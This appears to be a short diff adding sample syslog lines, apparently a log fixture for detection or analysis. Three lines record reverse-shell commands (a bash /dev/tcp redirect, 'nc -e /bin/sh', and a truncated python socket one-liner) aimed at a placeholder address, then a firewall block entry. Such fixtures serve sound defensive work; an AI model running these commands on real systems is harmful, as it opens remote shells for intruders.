@@ -1,0 +1,4 @@
+Oct 21 00:13:01 edge bash: user invoked: bash -i >& /dev/tcp/203.0.113.9/4444 0>&1
+Oct 21 00:13:05 edge audit: execve nc -e /bin/sh 203.0.113.9 4444
+Oct 21 00:13:10 edge python3: python3 -c 'import socket,subprocess,os;s=socket.socket()'
+Oct 21 00:13:40 edge kernel: [UFW BLOCK] IN=eth0 SRC=10.0.0.2 DST=10.0.0.5
